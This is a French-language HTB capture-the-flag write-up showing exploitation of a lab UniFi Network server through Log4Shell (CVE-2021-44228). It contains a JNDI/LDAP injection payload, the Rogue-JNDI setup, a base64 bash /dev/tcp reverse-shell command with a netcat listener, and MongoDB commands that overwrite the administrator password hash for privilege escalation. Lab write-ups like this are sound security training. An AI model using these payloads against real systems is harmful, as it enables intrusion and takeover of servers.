## Lab Title: Unified
- Date: 2025-09-27
- Duration: ~120 minutes

### Platform: HTB – Starting Point > Tier 2

### 1. Scenario Summary
1. Apprender comment exploiter **Log4j**

### 2. Findings
1. Exécuter: `Nmap`:
    - `nmap $ip -Pn --top-ports=10000`
    - On a trouvé ces ports ouverts:
    ```code
        PORT     STATE SERVICE
        22/tcp   open  ssh
        6789/tcp open  ibm-db2-admin
        8080/tcp open  http-proxy
        8443/tcp open  https-alt
        8843/tcp open  unknown
        8880/tcp open  cddbp-alt
    ```
2. Quand, on a analysé le port: `nmap $ip -Pn -sV -p T:8443`
    - On a trouvé le logiciel: `ssl/nagios-nsca Nagios NSCA`
    - Aussi, on a analysé: `https://10.129.152.123:8443` et on a trouvé: `Unifi Network` fonctionne avec la version: `6.4.54`

3. Cette version est associé avec la vulnerabilité: `CVE-2021-44228`

4. Cette vulnerabilité est associé avec **Apache Log4j** et l'attaque: **Remote Code Execution**
    - **Apache Log4j** >> une bibliothique où les dévelopeurs peuvent stocker les logs et les données differentes.
    - En cas particuliers, ce log peut venir comme `User Input` et il peut contenir les caractéristiques spéciales.
    - Enfin, le methode **Java**: **lookup** est appelé pour exécuter ce `input` >> `remote code execution`

5. Cette injection est arrivé avec ce protocole: `LDAP`

**Web Proxies:**
    - On utilise **Burp Suite** pour modifier `POST` demande
    - Dans le site Web, on fait login `admin:admin` et capture le `HTTP POST` avec `Burp Suite`
    - Utilisant `Repeater`, on place une modification dans la section: `remember`
        - `"${jndi:ldap://10.10.14.77/whatever"` >> c'est notre **payload**
        - **JNDI** >> Java Naming Directory Interface API:
            - En appelant cet API, les applications localisent des ressources et d'autres objets de programme.
            - Une ressource est un objet de programme qui fournit des connexions
            - à des systèmes tels que des serveurs de base de données et de systèmes de messagerie.
    - Après, on peut utiliser `traffic interception` pour vérifier si le serveur veut faire des connexions avec nous dans le port: `389` (LDAP)

6. On peut utiliser `tcpdump` pour montrer que le serveur a une vulnerabilité:
    - `sudo tcpdump -i tun0 port 389` et Appuyer sur le bouton `Send` dans le `Repeater` de `Burp Suite`
    - Après cela, on peut voir la connexion de la machine victime à notre machine: Voilà, cela montre une vulnerabilité:
    ```code
        snapshot length 393223 bytes 10:23:32.428116, IP 10.129.151.153.56242 > 10.10.14.77.ldap:
    ```

7. On doit installer `Open-JDK` et `Maven` pour creer une payload:
    - On a l'outil appelé: **Rogue-JNDI** >>
        - `git clone https://github.com/veracode-research/rogue-jndi`
        - `mvn package` >> pour construire le package.

8. Pour obtenir le `reverse shell`, on doit donner notre payload à **Rogue-JNDI** serveur:
    - `echo 'bash -c bash -i >&/dev/tcp/10.10.14.74/3828 0>&1' | base64` >> notre payload
    - `java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"`

    - Pour capturer `reverse shell` on commence **NetCat**: `nc -lvnp 3828`
    - Dans le `Burp Suite` on change le payload: `${jndi:ldap://10.10.14.77:1389/o=tomcat}`
    - On a obtenu le `reverse shell`

**Privelege Escalation:**
9. Quand on a analysé: `ps aux | grep mongo` >> le port `27117` est ouvert et fonctionne bien
    - On essaye pour obtenir le mot de passe de l'Administrator de `Mongo Database`
        - `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
            - **ace** >> `le nom du base de données par défaut pour l'application: Unifi`
            - **eval** : évaluer JSON script ici
    - On voit le mot de passe de l'Administrator: mais il est dans `x_shadow` >> on ne peut pas cracker  cela:
        - `$6$dksoidsiosid.L....`
    - **Donc, on peut remplacer ce mot de passe par un nouveau mot de passe:**
    - Pour cela, on utilise `mkpasswd` avec son nouveau mot de passe:
    - `mkpasswd -m sha-512 HelloMario`
        - Car `$6$` est un identifiant de `SHA-512`.

10. On fait un remplacement:
    ```don
        mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
    ```
    - Maintenant, on peut utiliser le compte de l'administrator avec son mot de passe: **administrator:HelloMario**
    - Dans le site Web, on fait login et il est possible de se connecter par **ssh**.
    - Et on a trouvé le mot de passe pour l'administrator: `NotACrackablePassword4U2022`

11. `ssh root@10.129.151.153` avec le mot de passe au-dessus. Voilà, c'est fini!

### 3. Idea
1. Log4j Exploitation.
